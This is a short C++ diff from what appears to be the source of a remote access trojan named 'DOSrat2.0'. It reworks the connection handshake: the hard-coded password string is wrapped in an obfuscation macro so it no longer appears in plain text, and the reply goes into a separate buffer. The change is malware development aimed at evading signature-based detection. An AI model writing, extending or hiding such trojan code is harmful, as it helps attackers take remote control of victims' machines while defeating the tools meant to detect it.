@@ -22,21 +22,22 @@ public:
 		SystemUtils su;
 		EasyMSGB msgb;
 
-		char Pass[10] = "DOSrat2.0";
+		string Pass = (string)AY_OBFUSCATE("DOSrat2.0");
+		char Buff[10];
 
 		TcpIP::SetTimeout(10000, Sock);
 
-		if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
+		if (send(Sock, Pass.c_str(), 10, 0) == SOCKET_ERROR)
 		{
 			TerminaConnessione(Sock);
 			return false;
 		}
-		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
+		if (recv(Sock, Buff, 10, 0) == SOCKET_ERROR)
 		{
 			TerminaConnessione(Sock);
 			return false;
 		}
-		if ((string)Pass != "DOSrat2.0")
+		if ((string)Buff != Pass)
 		{
 			TerminaConnessione(Sock);
 			return false;
